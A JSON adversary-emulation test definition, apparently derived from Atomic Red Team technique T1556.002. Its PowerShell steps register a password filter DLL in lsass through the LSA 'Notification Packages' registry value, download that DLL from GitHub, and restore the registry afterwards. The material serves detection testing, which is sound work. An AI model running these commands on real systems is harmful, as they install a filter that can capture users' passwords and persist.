{
  "id": "a7961770-beb5-4134-9674-83d7e1fa865c",
  "name": "Install and Register Password Filter DLL",
  "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "6fdad0b5-8afe-4544-b0a5-e4258db7885e",
      "type": "execute-command",
      "data": {
        "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5e64106e-9eba-4270-a2f9-1720e08e995e",
      "type": "execute-command",
      "data": {
        "command": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "e7941dbd-7702-4355-bf58-a8228bca9005",
      "name": "Check dependency 1/1",
      "description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "525ea383-ed5a-415b-a53b-23f64741261e",
      "name": "Resolve dependency 1/1",
      "description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5afae14e-38bc-4cce-b29a-6759744281f4",
      "name": "Re-check dependency 1/1",
      "description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "6fdad0b5-8afe-4544-b0a5-e4258db7885e",
      "p": "on-success",
      "o": "5e64106e-9eba-4270-a2f9-1720e08e995e"
    },
    {
      "s": "6fdad0b5-8afe-4544-b0a5-e4258db7885e",
      "p": "on-failure",
      "o": "5e64106e-9eba-4270-a2f9-1720e08e995e"
    },
    {
      "s": "e7941dbd-7702-4355-bf58-a8228bca9005",
      "p": "on-success",
      "o": "6fdad0b5-8afe-4544-b0a5-e4258db7885e"
    },
    {
      "s": "e7941dbd-7702-4355-bf58-a8228bca9005",
      "p": "on-failure",
      "o": "525ea383-ed5a-415b-a53b-23f64741261e"
    },
    {
      "s": "525ea383-ed5a-415b-a53b-23f64741261e",
      "p": "on-success",
      "o": "5afae14e-38bc-4cce-b29a-6759744281f4"
    },
    {
      "s": "5afae14e-38bc-4cce-b29a-6759744281f4",
      "p": "on-failure",
      "o": "6fdad0b5-8afe-4544-b0a5-e4258db7885e"
    }
  ],
  "tags": [
    "T1556.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "dll_name",
      "type": "string",
      "description": "Name of the Password Filter",
      "value": "AtomicRedTeamPWFilter.dll"
    },
    {
      "name": "dll_path",
      "type": "path",
      "description": "Path to DLL to be installed and registered",
      "value": "PathToAtomicsFolder\\T1556.002\\bin"
    }
  ]
}